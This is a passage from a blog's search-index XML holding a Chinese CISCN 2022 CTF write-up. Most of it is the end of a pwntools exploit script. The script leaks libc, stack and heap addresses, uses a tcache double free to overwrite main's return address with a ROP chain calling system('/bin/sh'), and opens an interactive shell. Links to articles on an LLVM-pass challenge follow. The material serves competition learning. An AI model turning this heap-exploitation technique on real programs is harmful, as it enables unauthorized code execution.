class="hljs-string">&#x27;libc_base&#x27;</span>)<br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br><br><span class="hljs-comment"># leak stack</span><br>show(<span class="hljs-number">0x487f5</span>)<br>stack_addr = uu64()<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i)  <span class="hljs-comment"># 0-9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(i)  <span class="hljs-comment"># 0-6</span><br><br><span class="hljs-comment"># leak heap</span><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>key = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">7</span>)     <span class="hljs-comment"># double free</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i)<br><span class="hljs-comment"># dbg()</span><br>pld = p64((stack_addr - <span class="hljs-number">0x138</span>) ^ key)<br>add(<span class="hljs-number">0</span>, pld)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>pld = p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>add(<span class="hljs-number">3</span>, pld)     <span class="hljs-comment"># change main_ret_address</span><br><br>sla(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)     <span class="hljs-comment"># exit</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h2><blockquote><p>找了三篇文章，之后可能会进行具体的学习：</p><p><a href="https://lakwsh.net/?p=457">CISCN 2022 初赛 satool writeup – 数字的秘密基地 (lakwsh.net)</a></p><p>[<a href="https://bbs.pediy.com/thread-273119.htm">原创]LLVM PASS类pwn题入门-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p><a href="https://blog.csdn.net/Vin_tt/article/details/118405231">(8条消息) Linux环境下LLVM + clang安装_dididadidaa的博客-CSDN博客_linux llvm</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF_competition：大哥别卷我</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
